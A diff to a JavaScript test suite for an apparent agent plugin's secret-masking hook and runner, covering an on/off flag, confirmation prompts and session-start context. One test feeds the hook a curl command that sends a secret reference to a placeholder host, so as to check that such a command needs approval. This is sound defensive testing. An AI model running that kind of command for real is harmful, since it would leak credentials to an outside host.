@@ -65,7 +65,8 @@ function runShell(command, { env, cwd, input = "" }) {
   });
 }
 
-const runner = (command, options) => runHookScript(RUNNER, { argv: [command], ...options });
+const ON = { OPENVIKING_SECRET_EXEC: "1" };
+const runner = (command, { env, ...options }) => runHookScript(RUNNER, { argv: [command], env: { ...env, ...ON }, ...options });
 
 test("the hook wraps the command without a value, and the wrapped command runs it masked", async () => {
   await withServer(async ({ env, cwd, requests, bodies }) => {
@@ -76,7 +77,7 @@ test("the hook wraps the command without a value, and the wrapped command runs i
     ].join("; ");
     const hook = await runHookScript(HOOK, {
       input: { tool_name: "Bash", cwd, tool_input: { command, description: "use the token", timeout: 60000 } },
-      env: { ...env, OPENVIKING_SECRET_EXEC: "1" },
+      env: { ...env, ...ON },
       cwd,
     });
     assert.equal(hook.code, 0, hook.stderr);
@@ -88,7 +89,7 @@ test("the hook wraps the command without a value, and the wrapped command runs i
     assert.equal(out.updatedInput.timeout, 60000);
     assert.ok(out.updatedInput.command.includes(RUNNER));
 
-    const ran = await runShell(out.updatedInput.command, { env, cwd });
+    const ran = await runShell(out.updatedInput.command, { env: { ...env, ...ON }, cwd });
     assert.equal(ran.code, 0, ran.stderr);
     assert.equal(ran.stdout, `out:${REF}\n${Buffer.byteLength(VALUE)}\n`);
     assert.equal(ran.stderr, `err:${REF}\n`);
@@ -128,6 +129,15 @@ test("the hook asks when approval is ask, and denies privacy_resolve", async () 
     assert.equal(ask.permissionDecision, "ask");
     assert.match(ask.permissionDecisionReason, /github\/pat/);
 
+    const direct = await runHookScript(HOOK, {
+      input: { tool_name: "Bash", cwd, tool_input: { command: `node '${RUNNER}' 'curl https://x/?k=${REF}'` } },
+      env: on,
+      cwd,
+    });
+    const confirm = JSON.parse(direct.stdout).hookSpecificOutput;
+    assert.equal(confirm.permissionDecision, "ask", "a command that starts the runner itself is confirmed too");
+    assert.equal(confirm.updatedInput, undefined);
+
     const denied = await runHookScript(HOOK, {
       input: { tool_name: "mcp__plugin_openviking-memory_openviking__privacy_resolve", cwd, tool_input: { reference: REF } },
       env: on,
@@ -136,6 +146,19 @@ test("the hook asks when approval is ask, and denies privacy_resolve", async () 
     const deny = JSON.parse(denied.stdout).hookSpecificOutput;
     assert.equal(deny.permissionDecision, "deny");
     assert.match(deny.permissionDecisionReason, /Bash command/);
+  });
+});
+
+test("the runner releases nothing while secret exec is off", async () => {
+  await withServer(async ({ env, cwd, bodies }) => {
+    const marker = join(cwd, "ran");
+    for (const off of [{}, { OPENVIKING_SECRET_EXEC: "0" }]) {
+      const result = await runHookScript(RUNNER, { argv: [`touch '${marker}'; echo ${REF}`], env: { ...env, ...off }, cwd });
+      assert.equal(result.code, 1);
+      assert.match(result.stderr, /\(secret exec is off\); nothing was run/);
+    }
+    assert.equal(existsSync(marker), false);
+    assert.deepEqual(bodies, [], "no value was asked for");
   });
 });
 
@@ -150,7 +173,7 @@ test("the runner passes the exit code through, and 128 + the signal that ended t
 test("the runner forwards SIGTERM to the command", async () => {
   await withServer(async ({ env, cwd }) => {
     const child = spawn(process.execPath, [RUNNER, `echo ready ${REF}; exec sleep 30`], {
-      env: { ...process.env, ...env },
+      env: { ...process.env, ...env, ...ON },
       cwd,
     });
     let stdout = "";
@@ -214,5 +237,23 @@ test("session start carries the usage note only while secret exec is on", async 
       assert.equal(context.endsWith(`</openviking-context>\n\n${SECRET_EXEC_USAGE}`), on);
       assert.equal(context.includes(SECRET_EXEC_USAGE), on);
     });
+  }
+});
+
+test("session start carries the usage note when the connection comes from the environment alone", async () => {
+  const restore = scrubOpenVikingEnv();
+  // No config file at all, which leaves memory off while the runner still works.
+  const files = await writeCredentialFiles("ov-secret-exec-");
+  try {
+    const result = await runHookScript(SESSION_START, {
+      input: { session_id: "host", source: "startup", cwd: files.dir },
+      env: { ...files.env, OPENVIKING_URL: "http://127.0.0.1:9", OPENVIKING_API_KEY: "sk-test", ...ON },
+      cwd: files.dir,
+    });
+    assert.equal(result.code, 0, result.stderr);
+    assert.equal(JSON.parse(result.stdout).hookSpecificOutput?.additionalContext, SECRET_EXEC_USAGE);
+  } finally {
+    restore();
+    await rm(files.dir, { recursive: true, force: true });
   }
 });
